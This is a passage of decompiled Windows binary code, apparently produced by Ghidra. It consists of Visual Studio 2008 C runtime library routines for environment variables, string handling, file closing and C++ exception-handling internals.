      ppcVar3 = ppcVar3 + 1;
      ppcVar1 = (char **)((int)ppcVar1 + 1);
      pcVar2 = *ppcVar3;
    }
    ppcVar1 = (char **)__calloc_crt((int)ppcVar1 + 1,4);
    ppcVar3 = ppcVar1;
    if (ppcVar1 == (char **)0x0) {
      __amsg_exit(9);
    }
    for (; *in_EAX != (char *)0x0; in_EAX = in_EAX + 1) {
      pcVar2 = __strdup(*in_EAX);
      *ppcVar3 = pcVar2;
      ppcVar3 = ppcVar3 + 1;
    }
    *ppcVar3 = (char *)0x0;
  }
  return ppcVar1;
}



// Library Function - Single Match
//  ___crtsetenv
// 
// Library: Visual Studio 2008 Release

int __cdecl ___crtsetenv(char **_POption,int _Primary)

{
  uint _Size;
  uchar *_Str;
  int *piVar1;
  uchar *puVar2;
  int iVar3;
  uint _Count;
  char **ppcVar4;
  size_t sVar5;
  char *_Dst;
  errno_t eVar6;
  BOOL BVar7;
  uchar **ppuVar8;
  bool bVar9;
  size_t _Size_00;
  uchar *_Src;
  int local_10;
  
  local_10 = 0;
  if (_POption == (char **)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  _Str = (uchar *)*_POption;
  if (((_Str == (uchar *)0x0) || (puVar2 = __mbschr(_Str,0x3d), puVar2 == (uchar *)0x0)) ||
     (_Str == puVar2)) {
LAB_00412454:
    piVar1 = __errno();
    *piVar1 = 0x16;
    return -1;
  }
  bVar9 = puVar2[1] == '\0';
  if (DAT_004196c4 == DAT_004196c8) {
    DAT_004196c4 = _copy_environ();
  }
  if (DAT_004196c4 == (char **)0x0) {
    if ((_Primary == 0) || (DAT_004196cc == (undefined4 *)0x0)) {
      if (bVar9) {
        return 0;
      }
      DAT_004196c4 = (char **)__malloc_crt(4);
      if (DAT_004196c4 == (char **)0x0) {
        return -1;
      }
      *DAT_004196c4 = (char *)0x0;
      if (DAT_004196cc == (undefined4 *)0x0) {
        DAT_004196cc = (undefined4 *)__malloc_crt(4);
        if (DAT_004196cc == (undefined4 *)0x0) {
          return -1;
        }
        *DAT_004196cc = 0;
      }
    }
    else {
      iVar3 = ___wtomb_environ();
      if (iVar3 != 0) goto LAB_00412454;
    }
  }
  ppcVar4 = DAT_004196c4;
  if (DAT_004196c4 == (char **)0x0) {
    return -1;
  }
  _Count = _findenv(_Str);
  if (((int)_Count < 0) || (*ppcVar4 == (char *)0x0)) {
    if (bVar9) {
      _free(_Str);
      *_POption = (char *)0x0;
      return 0;
    }
    if ((int)_Count < 0) {
      _Count = -_Count;
    }
    _Size = _Count + 2;
    if ((int)_Size < (int)_Count) {
      return -1;
    }
    if (0x3ffffffe < _Size) {
      return -1;
    }
    ppcVar4 = (char **)__recalloc_crt(DAT_004196c4,4,_Size);
    if (ppcVar4 == (char **)0x0) {
      return -1;
    }
    ppcVar4[_Count] = (char *)_Str;
    (ppcVar4 + _Count)[1] = (char *)0x0;
    *_POption = (char *)0x0;
  }
  else {
    ppuVar8 = (uchar **)(ppcVar4 + _Count);
    _free(*ppuVar8);
    if (!bVar9) {
      *ppuVar8 = _Str;
      *_POption = (char *)0x0;
      goto LAB_00412562;
    }
    while (*ppuVar8 != (uchar *)0x0) {
      *ppuVar8 = ppuVar8[1];
      _Count = _Count + 1;
      ppuVar8 = (uchar **)(ppcVar4 + _Count);
    }
    if ((0x3ffffffe < _Count) ||
       (ppcVar4 = (char **)__recalloc_crt(DAT_004196c4,_Count,4), ppcVar4 == (char **)0x0))
    goto LAB_00412562;
  }
  DAT_004196c4 = ppcVar4;
LAB_00412562:
  if (_Primary != 0) {
    _Size_00 = 1;
    sVar5 = _strlen((char *)_Str);
    _Dst = (char *)__calloc_crt(sVar5 + 2,_Size_00);
    if (_Dst != (char *)0x0) {
      _Src = _Str;
      sVar5 = _strlen((char *)_Str);
      eVar6 = _strcpy_s(_Dst,sVar5 + 2,(char *)_Src);
      if (eVar6 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      puVar2[(int)_Dst - (int)_Str] = '\0';
      BVar7 = SetEnvironmentVariableA
                        (_Dst,(LPCSTR)(~-(uint)bVar9 & (uint)(puVar2 + ((int)_Dst - (int)_Str) + 1))
                        );
      if (BVar7 == 0) {
        local_10 = -1;
        piVar1 = __errno();
        *piVar1 = 0x2a;
      }
      _free(_Dst);
    }
  }
  if (bVar9) {
    _free(_Str);
    *_POption = (char *)0x0;
    return local_10;
  }
  return local_10;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_00412670:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_00412670;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00412781;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00412781:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_0041b2e0 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_0041b2e0 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_004127f7;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_004127f9;
    }
  }
LAB_004127f7:
  DVar4 = 0;
LAB_004127f9:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2008 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041b2c4)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_004128f0();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_004128f0(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __strdup
// 
// Library: Visual Studio 2008 Release

char * __cdecl __strdup(char *_Src)

{
  char *_Dst;
  size_t sVar1;
  errno_t eVar2;
  
  if (_Src == (char *)0x0) {
    _Dst = (char *)0x0;
  }
  else {
    sVar1 = _strlen(_Src);
    _Dst = (char *)_malloc(sVar1 + 1);
    if (_Dst == (char *)0x0) {
      _Dst = (char *)0x0;
    }
    else {
      eVar2 = _strcpy_s(_Dst,sVar1 + 1,_Src);
      if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
    }
  }
  return _Dst;
}



// Library Function - Single Match
//  __mbschr_l
// 
// Library: Visual Studio 2008 Release

uchar * __cdecl __mbschr_l(uchar *_Str,uint _Ch,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int *piVar3;
  uint *puVar4;
  _LocaleUpdate local_14 [4];
  int local_10;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,_Locale);
  if (_Str == (uchar *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    _Str = (uchar *)0x0;
  }
  else {
    if (*(int *)(local_10 + 8) == 0) {
      _Str = (uchar *)FUN_00406820((uint *)_Str,(char)_Ch);
    }
    else {
      while( true ) {
        bVar2 = *_Str;
        if (bVar2 == 0) break;
        if ((*(byte *)(bVar2 + 0x1d + local_10) & 4) == 0) {
          puVar4 = (uint *)_Str;
          if (_Ch == bVar2) break;
        }
        else {
          bVar1 = *(byte *)(uint *)((int)_Str + 1);
          if (bVar1 == 0) goto LAB_00412a2a;
          puVar4 = (uint *)((int)_Str + 1);
          if (_Ch == CONCAT11(bVar2,bVar1)) goto LAB_00412a1c;
        }
        _Str = (uchar *)((int)puVar4 + 1);
      }
      if (_Ch != (ushort)bVar2) {
LAB_00412a2a:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return (uchar *)0x0;
      }
    }
LAB_00412a1c:
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return _Str;
}



// Library Function - Single Match
//  __mbschr
// 
// Library: Visual Studio 2008 Release

uchar * __cdecl __mbschr(uchar *_Str,uint _Ch)

{
  uchar *puVar1;
  
  puVar1 = __mbschr_l(_Str,_Ch,(_locale_t)0x0);
  return puVar1;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x00412a54. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
                    // WARNING: Load size is inaccurate
  ExceptionList = *ExceptionList;
                    // WARNING: Could not recover jumptable at 0x00412a85. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x00412a91. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2008 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  void *pvVar1;
  
  pvVar1 = ExceptionList;
  RtlUnwind(param_1,(PVOID)0x412abe,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *(void **)pvVar1 = ExceptionList;
  ExceptionList = pvVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  _s_FuncInfo *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
// CatchGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  _Var1 = ___InternalCxxFrameHandler
                    ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,'\0');
  return _Var1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x412bfb;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_00418df8 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)ExceptionList;
    ExceptionList = &local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 != 0) {
                    // WARNING: Load size is inaccurate
      *local_2c = *ExceptionList;
    }
    ExceptionList = local_2c;
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x00412cbe. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2008 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  TryBlockMapEntry *pTVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  pTVar1 = param_1->pTryBlockMap;
  uVar5 = param_1->nTryBlocks;
  uVar2 = uVar5;
  uVar3 = uVar5;
  while (uVar4 = uVar2, -1 < param_2) {
    if (uVar5 == 0xffffffff) {
      _inconsistency();
    }
    uVar5 = uVar5 - 1;
    if (((pTVar1[uVar5].tryHigh < param_3) && (param_3 <= pTVar1[uVar5].catchHigh)) ||
       (uVar2 = uVar4, uVar5 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar5;
      uVar3 = uVar4;
    }
  }
  uVar5 = uVar5 + 1;
  *param_4 = uVar5;
  *param_5 = uVar3;
  if ((param_1->nTryBlocks < uVar3) || (uVar3 < uVar5)) {
    _inconsistency();
  }
  return pTVar1 + uVar5;
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2008 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  void *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_00418df8 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = ExceptionList;
  ExceptionList = &local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  ExceptionList = local_1c;
  return pvVar1;
}



// Library Function - Single Match
//  public: __thiscall std::bad_exception::bad_exception(char const *)
// 
// Library: Visual Studio 2008 Release

bad_exception * __thiscall std::bad_exception::bad_exception(bad_exception *this,char *param_1)

{
  exception::exception((exception *)this,&param_1);
  *(undefined ***)this = vftable;
  return this;
}



undefined4 * __thiscall FUN_00412e69(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_exception::vftable;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00406bc9(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_00412ee8:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_00412ec7:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_00412ee8;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_00412ec7;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___FrameUnwindFilter
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl ___FrameUnwindFilter(int **param_1)

{
  _ptiddata p_Var1;
  
  if (**param_1 == -0x1fbcb0b3) {
    p_Var1 = __getptd();
    if (0 < p_Var1->_ProcessingThrow) {
      p_Var1 = __getptd();
      p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
    }
  }
  else if (**param_1 == -0x1f928c9d) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = 0;
    terminate();
    return p_Var1;
  }
  return (_ptiddata)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2008 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int *piVar3;
  int iVar4;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar4 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar4 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar4 != param_4) {
    if ((iVar4 < 0) || (*(int *)(param_3 + 4) <= iVar4)) {
      _inconsistency();
    }
    iVar2 = iVar4 * 8;
    piVar3 = (int *)(*(int *)(param_3 + 8) + iVar2);
    iVar4 = *piVar3;
    if (piVar3[1] != 0) {
      *(int *)(param_1 + 8) = iVar4;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar2),param_1,0x103);
    }
  }
  FUN_00412ffe();
  if (iVar4 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar4;
  return;
}



void FUN_00412ffe(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



undefined4 FUN_00413019(void)

{
  int *piVar1;
  int iVar2;
  int **in_EAX;
  _ptiddata p_Var3;
  
  piVar1 = *in_EAX;
  if ((((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&
      ((iVar2 = piVar1[5], iVar2 == 0x19930520 || ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))
      ) && (piVar1[7] == 0)) {
    p_Var3 = __getptd();
    *(undefined4 *)((p_Var3->_setloc_data)._cacheout + 0x27) = 1;
    return 1;
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2008 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2008 Release

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
